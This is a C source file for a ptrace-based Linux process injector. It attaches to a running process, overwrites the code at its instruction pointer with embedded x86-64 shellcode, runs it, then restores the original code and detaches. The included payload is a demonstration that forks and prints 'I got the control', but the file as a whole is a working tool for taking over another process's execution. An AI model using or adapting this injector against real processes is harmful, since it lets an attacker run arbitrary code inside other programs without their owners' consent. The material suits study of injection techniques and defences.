#include <sys/ptrace.h>
#include <sys/user.h>
#include <sys/wait.h>
#include <stdio.h>
#include <stdlib.h>
#include <errno.h>

typedef struct user_regs_struct t_regs;
typedef unsigned char           byte;
/*
    ./injector PID
*/

void    save_text_buffer(pid_t target_pid, byte *buf, size_t buf_len, void *orig_rip)
{
    int         i;
    u_int32_t   *text;
    u_int32_t   *save;

    text = (u_int32_t *)orig_rip;
    save = (u_int32_t *)buf;
    i = 0;
    printf("[+] Saving text_buffer\n");

    while (i < buf_len) {
        *save = (u_int32_t)ptrace(PTRACE_PEEKTEXT, target_pid, text, NULL);
        text++;
        save++;
        i += 4;
    }
}

void    restore_text_buffer(pid_t target_pid, byte *buf, size_t buf_len, void *orig_rip)
{
    int         i;
    u_int32_t   *text;
    u_int32_t   *save;

    text = (u_int32_t *)orig_rip;
    save = (u_int32_t *)buf;
    i = 0;

    printf("[+] Restoring text_buffer\n");
    while (i < buf_len) {
        ptrace(PTRACE_POKETEXT, target_pid, text, *save);
        text++;
        save++;
        i += 4;
    }
}

void    inject_into_process(pid_t target_pid, byte *shellcode, size_t shellcode_len, void *orig_rip)
{
    int         i;
    u_int32_t   *text;
    u_int32_t   *sc;

    text = (u_int32_t *)orig_rip;
    sc = (u_int32_t *)shellcode;
    i = 0;

    printf("[+] Injecting shellcode at %p\n", orig_rip);
    while (i < shellcode_len) {
        ptrace(PTRACE_POKETEXT, target_pid, text, *sc);
        text++;
        sc++;
        i += 4;
    }

    printf("[+] Executing the shellcode\n");
    if ((ptrace(PTRACE_CONT, target_pid, NULL, NULL))) {
        perror("ptrace(CONT)");
        exit(EXIT_FAILURE);
    }
}

int     main(int ac, char **av)
{
    pid_t   target_pid;
    byte    shellcode[] = "\x48\x31\xc0\xb0\x39\x0f\x05\x85\xc0\x75\x33\xb0\x01\x48\x31\xff\x48\xff\xc7\x48\x8d\x35\x11\x00\x00\x00\x48\x31\xd2\xba\x13\x00\x00\x00\x0f\x05\xb0\x3c\x48\x31\xff\x0f\x05\x49\x20\x67\x6f\x74\x20\x74\x68\x65\x20\x63\x6f\x6e\x74\x72\x6f\x6c\x0a\x00\xcc";
    t_regs  regs;
    byte    buf[64];
    int     status;

    errno = 0;
    if (ac != 2) {
        dprintf(2, "Usage : %s PID\n", av[0]);
        return(EXIT_FAILURE);
    }

    if (!(target_pid = atoi(av[1]))) {
        dprintf(2, "Invalid PID: must be a non-null integer\n");
        return(EXIT_FAILURE);
    }
 
    if ((ptrace(PTRACE_ATTACH, target_pid, NULL, NULL))) {
        perror("ptrace(ATTACH)");
        return(EXIT_FAILURE);
    }
    printf("[+] Attached to process\n");
    if ((ptrace(PTRACE_GETREGS, target_pid, NULL, &regs))) {
        perror("ptrace(GETREGS)");
        return(EXIT_FAILURE);
    }
    printf("[+] Got the regs\n");
    save_text_buffer(target_pid, buf, sizeof(shellcode), (void *)regs.rip);
    inject_into_process(target_pid, shellcode, sizeof(shellcode), (void *)regs.rip);

    waitpid(target_pid, &status, WUNTRACED);
    if (WIFSTOPPED(status) && WSTOPSIG(status) == SIGTRAP) {
        printf("[+] SIGTRAP received\n");
    }

    restore_text_buffer(target_pid, buf, sizeof(shellcode), (void *)regs.rip);
    if ((ptrace(PTRACE_SETREGS, target_pid, NULL, &regs))) {
        perror("ptrace(SETREGS)");
        return(EXIT_FAILURE);
    }
    printf("[+] Restored the regs\n");

    if ((ptrace(PTRACE_DETACH, target_pid, NULL, NULL))) {
        perror("ptrace(DETACH)");
        return(EXIT_FAILURE);
    }
    printf("[+] Detached from process\n");

    return (EXIT_SUCCESS);
}
